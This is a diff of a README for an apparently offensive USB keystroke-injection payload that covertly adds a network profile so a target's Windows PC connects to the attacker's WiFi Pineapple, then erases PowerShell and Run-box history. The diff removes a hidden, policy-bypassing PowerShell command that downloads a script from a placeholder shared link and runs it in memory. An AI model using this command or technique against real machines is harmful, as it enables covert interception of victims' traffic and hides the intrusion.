@@ -13,22 +13,20 @@
   </ol>
 </details>
 
-# OMG-PineApple
+# PineApple
 
 A script used to connect a targets PC to your wifi PineApple
 
 ## Description
 
 This program will generate an XML file that will be used to create a network profile for your Wifi PineApple. 
-Depending on your method of execution the XML file will either be manually entered into a powershell window 
-or you may use and Invoke Web-Request to download a script to add the network profile. After either the history of
+The XML file will be manually entered into a powershell window 
 the powershell window and run box will be erased for a clean exit. 
 
 ## Getting Started
 
 ### Dependencies
 
-* DropBox or another File Hosting service - Your Shared link for the intended file
 * Windows 10,11
 
 <p align="right">(<a href="#top">back to top</a>)</p>
@@ -36,12 +34,7 @@ the powershell window and run box will be erased for a clean exit.
 ### Executing program
 
 * Plug in your device
-* Either the entire script will be manually entered into the powershell window or
-* Invoke-WebRequest will be entered in the Run Box to download and execute the script from memory
-* PS1 file to download is provided above
-```
-powershell -w h -NoP -NonI -Exec Bypass $pl = iwr https:// < Your Shared link for the intended file> ?dl=1; invoke-expression $pl
-```
+* The entire script will be manually entered into the powershell window 
 
 <p align="right">(<a href="#top">back to top</a>)</p>
 
